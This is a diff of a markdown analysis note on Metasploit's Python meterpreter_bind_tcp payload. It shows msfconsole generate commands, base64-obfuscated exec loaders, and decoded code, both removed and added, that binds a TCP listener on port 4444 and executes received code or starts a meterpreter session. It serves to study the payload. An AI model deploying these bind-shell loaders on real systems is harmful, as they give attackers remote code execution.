@@ -1,60 +1,46 @@
-# Metasploit Python meterpreter_bind_tcp
+# Metasploit python meterpreter_bind_tcp (single payload)
 
-## Stage 1 (Stager/Loader)
-
-### Generate
-```
-msf5> use payload/python/meterpreter/bind_tcp
-msf5 payload(python/meterpreter/bind_tcp) > generate -f raw -o stage1.py
-```
-
-### Result
-```python
-import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHNvY2tldCxzdHJ1Y3QKYj1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQpiLmJpbmQoKCcwLjAuMC4wJyw0NDQ0KSkKYi5saXN0ZW4oMSkKcyxhPWIuYWNjZXB0KCkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdihsKQp3aGlsZSBsZW4oZCk8bDoKCWQrPXMucmVjdihsLWxlbihkKSkKZXhlYyhkLHsncyc6c30pCg==')))
-```
-
-Note: the dict is used to apply py2/3 compatibility with regards to decoding strings
-
-#### Base64 Decoded Content
-```python
-import socket,struct
-b=socket.socket(2,socket.SOCK_STREAM)   # 2 = socket.AF_INET
-b.bind(('0.0.0.0',4444))
-b.listen(1)                             # 1 = backlog, maximum number of queued connections
-s,a=b.accept()
-l=struct.unpack('>I',s.recv(4))[0]      # Read the length of the payload into a 4 byte unsigned integer in native byte order
-d=s.recv(l)                             # receive data, bufsize=l
-while len(d)<l:
-	d+=s.recv(l-len(d))
-exec(d,{'s':s})                         # provide the socket file descriptor as global var 's' to payload in d
-```
-
-## Stage 2 (Meterpreter shell)
+## Single payload
 
 ### Generate
-```
-msf5> use payload/python/meterpreter_bind_tcp
-msf5 payload(python/meterpreter_bind_tcp) > generate -f raw -o stage2.py
-```
 
+```
+msf5 > use payload/python/meterpreter_bind_tcp
+msf5 payload(python/meterpreter_bind_tcp) > generate -f raw -o single.py
+```
 ### Result
 ```python
-import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('IyEvdXN...')))
+import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('IyEvdXNyL2Jpbi9weXRob24KaW1wb3J0IGJpbmFzY2lpCmltcG9yd...
+...)))
 ```
 
 ### Base64 Decoded Content
+The meterpreter payload is invocated as follows (see end of file):
 ```python
-f = open('python_stage2.py')
-code = f.read()
-exec(code.replace('exec, 'print'))
-#!/usr/bin/python
-import binascii
-import code
-import os
-import platform
-import random
-import re
 ...
+_try_to_fork = TRY_TO_FORK and hasattr(os, 'fork')
+if not _try_to_fork or (_try_to_fork and os.fork() == 0):
+    if hasattr(os, 'setsid'):
+        try:
+            os.setsid()
+        except OSError:
+            pass
+    if HTTP_CONNECTION_URL and has_urllib:
+        transport = HttpTransport(HTTP_CONNECTION_URL, proxy=HTTP_PROXY, user_agent=HTTP_USER_AGENT,
+                http_host=HTTP_HOST, http_referer=HTTP_REFERER, http_cookie=HTTP_COOKIE)
+    else:
+        bind_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+        bind_sock.bind(('0.0.0.0', 4444))
+
+        bind_sock.listen(1)
+
+        s, address = bind_sock.accept()
+
+        transport = TcpTransport.from_socket(s)
+    met = PythonMeterpreter(transport)
+    # PATCH-SETUP-TRANSPORTS #
+    met.run()
 ```
 
-Stored in file `stage2_decoded.py`
+Full payload contents are stored in file `single_decoded.py`.
